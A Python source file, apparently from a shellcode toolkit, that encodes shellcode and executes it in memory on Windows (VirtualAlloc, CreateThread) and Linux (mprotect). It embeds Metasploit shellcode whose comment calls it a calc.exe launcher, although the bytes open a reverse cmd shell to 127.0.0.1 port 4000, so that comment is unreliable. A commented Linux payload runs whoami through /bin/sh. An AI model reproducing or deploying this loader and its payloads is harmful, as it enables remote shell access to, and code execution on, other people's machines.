#!/usr/bin/python
import ctypes
from Encoders import *
from Shellcodes import *
from ast import literal_eval
from ShellUtils import Constants

class RunShellcode():
    def run(self, shellcode_string, platform, encoder=''):
        if encoder:
            BADCHARS = ["\x00", "\x0a", "\x0d"]
            new_encoder = CodeEncoders(platform, platform, Constants.OS_ARCH.X32, BADCHARS)
            if encoder == Constants.EncoderType.XOR:
                shellcode_string = new_encoder.xor_encoder(shellcode_string, debug=1)
            elif encoder == Constants.EncoderType.ALPHANUMERIC:
                shellcode_string = new_encoder.alphanum_encoder(shellcode_string, debug=1)

        if platform == Constants.OS.WINDOWS:
            shellcode = bytearray(shellcode_string)

            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                      ctypes.c_int(len(shellcode)),
                                                      ctypes.c_int(0x3000),
                                                      ctypes.c_int(0x40))

            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                                 buf,
                                                 ctypes.c_int(len(shellcode)))

            ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                     ctypes.c_int(0),
                                                     ctypes.c_int(ptr),
                                                     ctypes.c_int(0),
                                                     ctypes.c_int(0),
                                                     ctypes.pointer(ctypes.c_int(0)))

            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
        elif platform == Constants.OS.LINUX:
            shellcode = ctypes.c_char_p(shellcode_string)
            function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))
            addr = ctypes.cast(function, ctypes.c_void_p).value
            libc = ctypes.CDLL('libc.so.6')
            pagesize = libc.getpagesize()
            addr_page = (addr // pagesize) * pagesize
            for page_start in range(addr_page, addr + len(shellcode_string), pagesize):
                assert libc.mprotect(page_start, pagesize, 0x7) == 0
            function()
        else:
            print("Unknown platform")
            return

if __name__ == "__main__":

    #x86/shikata_ga_nai succeeded with size 227 (iteration=1)
    #Metasploit windows/exec calc.exe
    shellcode = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
                "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
                "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
                "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
                "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
                "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
                "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
                "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
                "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
                "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
                "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
                "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
                "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
                "\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
                "\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x7f\x00\x00\x01\x68"
                "\x02\x00\x0f\xa0\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
                "\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
                "\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
                "\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
                "\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
                "\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
                "\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
                "\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
                "\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
                "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5")
    # Linux x86 test shellcode
    # ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
    # "\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x10\x00\x00\x00\x2f"
    # "\x75\x73\x72\x2f\x62\x69\x6e\x2f\x77\x68\x6f\x61\x6d\x69\x00"
    # "\x57\x53\x89\xe1\xcd\x80");
    rsc = RunShellcode()
    rsc.run(shellcode, Constants.OS.WINDOWS, None)


